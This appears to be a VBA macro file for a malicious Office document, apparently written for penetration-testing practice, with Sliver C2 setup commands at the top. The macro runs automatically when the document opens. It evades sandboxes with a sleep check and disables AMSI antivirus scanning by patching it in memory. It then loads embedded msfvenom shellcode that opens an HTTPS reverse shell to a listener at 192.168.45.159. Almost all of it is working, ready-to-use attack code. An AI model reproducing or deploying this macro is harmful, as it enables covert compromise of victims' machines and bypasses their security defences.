'Sliver Setup
'Profile
'sliver > profiles new -b https://192.168.45.159:443 --evasion --format shellcode --arch x86 offsec-vba
'Listener
'sliver > https -L 192.168.45.159 -l 443 -c /tmp/google.crt -k /tmp/google.key
'Stager
'sliver > stage-listener --url https://192.168.45.159:10443 --profile offsec-vba -c /tmp/google.crt -k /tmp/google.key --prepend-size

'av / 4msi
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
'std
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
'run
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Function MyMacro()
    Dim myTime
    Dim Timein As Date
    Dim second_time
    Dim Timeout As Date
    Dim subtime As Variant
    Dim vOut As Integer
    'Get current time, sleep 4 seconds, get time again.  If less than 4 seconds have passed, assume we are
    ' in a AV sandbox and exit without running rest of macro
    myTime = Time
    Timein = Date + myTime
    Sleep (4000)
    second_time = Time
    Timeout = Date + second_time
    subtime = DateDiff("s", Timein, Timeout)
    vOut = CInt(subtime)
    If subtime < 3.5 Then
        Exit Function
    End If
    
    'initialize variables
    Dim Is64 As Boolean
    Dim StrFile As String
    Dim check As Boolean
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As LongPtr
    Dim data As String
    Dim res As LongPtr
    
    ' Don't deem useful, leaving commented bc its still pretty cool in case anyone wants to use it
    'Dim ipcheck As Boolean
    'ipcheck = False
    'Dim inscope As String
    ''define in scope IP's.  We can use wildcards here.
    'inscope = "192.168.*"
    ''Call ip check function.  Returns True if machine IP is in scope. If True, pass.  If False, exit.
    'ipcheck = getMyIP(inscope)
    'If ipcheck Then
    'Else
    '    Exit Function
    'End If

    'Dynamically resolve amsi.dll
    StrFile = Dir("c:\windows\system32\a?s?.d*")
    'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
    Is64 = arch()
    'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found.
    check = amcheck(StrFile, Is64)
    
    'If amsi is found, call amsi patching function.  Pass architecture of Word as additional arg to function.
    If check Then
        patch StrFile, Is64
    End If

    'payload
    If Is64 Then
        'Sliver
        'msfvenom --payload windows/x64/custom/reverse_winhttps LHOST=192.168.45.159 LPORT=10443 LURI=/hello.woff --format vbapplication --out vbs
        buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,72,49,210,86,101,72,139,82,96,72,139,82,24,72,139,82,32,72,15,183,74,74,77,49,201,72,139,114,80,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,102,129,120,24, _
        11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,139,72,24,80,68,139,64,32,73,1,208,227,86,77,49,201,72,255,201,65,139,52,136,72,1,214,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
        208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,65,88,72,1,208,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255,93,72,49,219,83,73,190,119,105,110,104,116,116,112,0,65,86,72,137,225,73,199,194,76,119,38,7, _
        255,213,83,83,72,137,225,83,90,77,49,192,77,49,201,83,83,73,186,4,31,157,187,0,0,0,0,255,213,73,137,196,232,30,0,0,0,49,0,57,0,50,0,46,0,49,0,54,0,56,0,46,0,52,0,53,0,46,0,49,0,53,0,57,0,0,0,90,72,137,193,73,199,192,203,40,0,0,77,49, _
        201,73,186,70,155,30,194,0,0,0,0,255,213,232,20,2,0,0,104,0,116,0,116,0,112,0,115,0,58,0,47,0,47,0,49,0,57,0,50,0,46,0,49,0,54,0,56,0,46,0,52,0,53,0,46,0,49,0,53,0,57,0,58,0,49,0,48,0,52,0,52,0,51,0,47,0,104,0,101,0, _
        108,0,108,0,111,0,46,0,119,0,111,0,102,0,102,0,47,0,121,0,90,0,101,0,110,0,51,0,72,0,117,0,78,0,56,0,105,0,78,0,101,0,98,0,108,0,57,0,115,0,79,0,78,0,45,0,68,0,115,0,103,0,67,0,56,0,52,0,97,0,103,0,109,0,102,0,103,0,51,0, _
        75,0,116,0,116,0,114,0,81,0,56,0,100,0,105,0,45,0,116,0,53,0,101,0,116,0,70,0,83,0,82,0,95,0,107,0,105,0,105,0,118,0,83,0,86,0,54,0,69,0,57,0,73,0,108,0,113,0,57,0,113,0,89,0,55,0,97,0,76,0,107,0,69,0,49,0,87,0,56,0, _
        57,0,86,0,88,0,83,0,68,0,72,0,112,0,57,0,107,0,102,0,81,0,51,0,98,0,45,0,84,0,87,0,45,0,121,0,115,0,90,0,100,0,49,0,48,0,83,0,75,0,75,0,53,0,73,0,102,0,71,0,113,0,81,0,52,0,101,0,56,0,83,0,45,0,116,0,90,0,108,0, _
        104,0,117,0,88,0,111,0,68,0,56,0,121,0,65,0,54,0,54,0,100,0,95,0,83,0,79,0,113,0,109,0,77,0,86,0,113,0,120,0,106,0,66,0,79,0,74,0,112,0,76,0,74,0,114,0,110,0,112,0,49,0,112,0,90,0,70,0,101,0,68,0,85,0,98,0,95,0,100,0, _
        76,0,74,0,97,0,107,0,56,0,66,0,116,0,53,0,82,0,103,0,102,0,72,0,98,0,116,0,104,0,116,0,105,0,68,0,49,0,97,0,106,0,95,0,55,0,88,0,50,0,71,0,71,0,70,0,79,0,76,0,90,0,49,0,48,0,101,0,101,0,73,0,106,0,71,0,109,0,84,0, _
        104,0,74,0,49,0,75,0,49,0,84,0,102,0,51,0,100,0,97,0,116,0,53,0,65,0,54,0,90,0,110,0,108,0,73,0,50,0,74,0,65,0,101,0,103,0,57,0,110,0,102,0,85,0,51,0,116,0,52,0,67,0,70,0,82,0,77,0,0,0,72,137,193,83,90,65,88,77,137,197, _
        73,131,192,56,77,49,201,83,72,199,192,0,1,128,0,80,83,83,73,199,194,152,16,179,91,255,213,72,137,198,72,131,232,32,72,137,231,72,137,249,73,199,194,33,167,11,96,255,213,133,192,15,132,109,0,0,0,72,139,71,8,133,192,116,58,72,137,217,72,255,193,72,193,225,32,81,83,80,72,184, _
        3,0,0,0,3,0,0,0,80,73,137,224,72,131,236,32,72,137,231,73,137,249,76,137,225,76,137,234,73,199,194,218,221,234,73,255,213,133,192,116,45,235,18,72,139,71,16,133,192,116,35,72,131,199,8,106,3,88,72,137,7,73,137,248,106,24,65,89,72,137,241,106,38,90,73,186,211,88,157,206, _
        0,0,0,0,255,213,106,10,95,72,137,241,106,31,90,82,104,0,51,0,0,73,137,224,106,4,65,89,73,186,211,88,157,206,0,0,0,0,255,213,77,49,192,83,90,72,137,241,77,49,201,83,83,83,83,73,186,149,88,187,145,0,0,0,0,255,213,133,192,117,12,72,255,207,116,2,235,187,232,121, _
        0,0,0,72,137,241,83,90,73,199,194,5,136,157,112,255,213,133,192,116,233,83,72,137,226,83,73,137,225,106,4,65,88,72,137,241,73,199,194,108,41,36,126,255,213,133,192,116,205,72,131,196,40,83,89,90,72,137,211,106,64,65,89,73,199,192,0,16,0,0,73,186,88,164,83,229,0,0,0,0, _
        255,213,72,147,83,83,72,137,231,72,137,241,73,137,192,72,137,218,73,137,249,73,199,194,108,41,36,126,255,213,72,131,196,32,133,192,15,132,132,255,255,255,88,195,88,106,0,89,73,199,194,240,181,162,86,255,213)
    Else
        'Sliver
        'msfvenom --payload windows/custom/reverse_winhttps LHOST=192.168.45.159 LPORT=10443 LURI=/hello.woff --format vbapplication --out vbs
        buf = Array(252,232,143,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,49,255,15,183,74,38,139,114,40,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,80,139,72,24,139,88,32,1,211,133,201,116,60,73,49, _
        255,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,116,116,112,0,104,119,105,110,104,84, _
        104,76,119,38,7,255,213,49,219,83,83,83,83,83,104,4,31,157,187,255,213,80,83,104,203,40,0,0,232,99,2,0,0,104,0,116,0,116,0,112,0,115,0,58,0,47,0,47,0,49,0,57,0,50,0,46,0,49,0,54,0,56,0,46,0,52,0,53,0,46,0,49,0,53,0,57,0,58,0,49, _
        0,48,0,52,0,52,0,51,0,47,0,104,0,101,0,108,0,108,0,111,0,46,0,119,0,111,0,102,0,102,0,47,0,75,0,113,0,45,0,72,0,118,0,66,0,71,0,118,0,72,0,55,0,98,0,67,0,114,0,77,0,79,0,116,0,112,0,66,0,48,0,82,0,89,0,119,0,103,0,79, _
        0,56,0,74,0,97,0,68,0,54,0,48,0,105,0,49,0,113,0,55,0,50,0,52,0,109,0,56,0,57,0,80,0,86,0,89,0,118,0,68,0,51,0,115,0,113,0,114,0,66,0,98,0,56,0,121,0,111,0,101,0,77,0,65,0,116,0,112,0,73,0,109,0,66,0,99,0,72,0,69, _
        0,104,0,67,0,104,0,81,0,110,0,121,0,95,0,73,0,119,0,107,0,80,0,82,0,103,0,104,0,117,0,82,0,75,0,90,0,49,0,95,0,106,0,83,0,88,0,103,0,53,0,57,0,102,0,81,0,50,0,56,0,80,0,48,0,68,0,117,0,102,0,53,0,111,0,115,0,56,0,55, _
        0,90,0,101,0,51,0,113,0,109,0,73,0,65,0,76,0,104,0,112,0,51,0,117,0,65,0,82,0,119,0,89,0,87,0,106,0,78,0,50,0,97,0,65,0,79,0,76,0,90,0,101,0,117,0,65,0,84,0,106,0,99,0,111,0,0,0,131,199,56,80,104,70,155,30,194,255,213,104,0, _
        1,128,0,83,83,83,87,83,80,104,152,16,179,91,255,213,150,131,236,16,137,224,87,137,199,87,104,33,167,11,96,255,213,133,192,116,77,139,71,4,133,192,116,42,90,131,234,56,106,1,83,83,80,106,3,106,3,137,224,131,236,12,137,231,87,80,82,141,68,36,64,255,48,104,218,221,234,73,255,213, _
        133,192,116,30,235,15,139,71,8,133,192,116,21,106,4,88,1,199,72,137,7,106,12,87,106,38,86,104,211,88,157,206,255,213,104,0,51,0,0,137,224,106,4,80,106,31,86,104,211,88,157,206,255,213,106,10,95,83,83,83,83,83,83,86,104,149,88,187,145,255,213,133,192,117,8,79,117,235,232,117, _
        0,0,0,83,86,104,5,136,157,112,255,213,133,192,116,238,83,137,224,83,137,231,87,106,4,80,86,104,108,41,36,126,255,213,91,91,133,192,116,214,49,192,106,64,104,0,16,0,0,83,80,104,88,164,83,229,255,213,147,83,83,137,231,87,80,83,86,104,108,41,36,126,255,213,133,192,15,132,172,255, _
        255,255,88,195,95,232,249,254,255,255,49,0,57,0,50,0,46,0,49,0,54,0,56,0,46,0,52,0,53,0,46,0,49,0,53,0,57,0,0,0,187,240,181,162,86,106,0,83,255,213)
    End If

    'Create new space in memory within current process
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    'Copy shellcode to newly created memory
    For counter = LBound(buf) To UBound(buf)
        data = Hex(buf(counter))
        patched ByVal (addr + counter), 1, ByVal ("&H" & data)
    Next counter
    'create thread to execute shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Function arch() As Boolean
 'check architecture of current word process
    #If Win64 Then
        arch = True
    #Else
        arch = False
    #End If
End Function

'Public Function getMyIP(ipcheck As String) As Boolean
''uses WMI to get all IP's associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True
'    Dim objWMI As Object
'    Dim objQuery As Object
'    Dim objQueryItem As Object
'    Dim vIpAddress
'    Dim counter As Integer
'    Dim ips() As String
'    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
'    Set objQuery = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
'    For Each objQueryItem In objQuery
'        For Each vIpAddress In objQueryItem.ipaddress
'            If CStr(vIpAddress) Like ipcheck Then
'                getMyIP = True
'            End If
'        Next
'    Next
'End Function

Function amcheck(StrFile As String, Is64 As Boolean) As Boolean
    'Checks for amsi.dll in word process. If found, returns True
    Dim szProcessName As String
    Dim hMod(0 To 1023) As LongPtr
    Dim numMods As Integer
    Dim res As LongPtr
    amcheck = False
    
    'Assumes 1024 bytes will be enough to hold the module handles
    res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
    If Is64 Then
        numMods = cbNeeded / 8
    Else
        numMods = cbNeeded / 4
    End If
    
    For i = 0 To numMods
        szProcessName = String$(50, 0)
        GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
        If Left(szProcessName, 8) = StrFile Then
            amcheck = True
        End If
        Next i
End Function

Sub patch(StrFile As String, Is64 As Boolean)
    ' Patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.
    ' The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them. 
    ' Depending on architecture these offsets vary, so a case is included for x86 and x64
    Dim lib As LongPtr
    Dim Func_addr As LongPtr
    Dim temp As LongPtr
    Dim old As LongPtr
    Dim off As Integer

    lib = getmod(StrFile)
    If Is64 Then
        off = 96
    Else
        off = 80
    End If
    
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, 0)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)

    If Is64 Then
        off = 352
    Else
        off = 256
    End If
    ' WARNING: This often breaks here. If somethings not working, remove this second patch
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, old)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
End Sub

'macro name is test which calls the main method
Sub test()
    MyMacro
End Sub

Sub Document_Open()
    test
End Sub
Sub AutoOpen()
    test
End Sub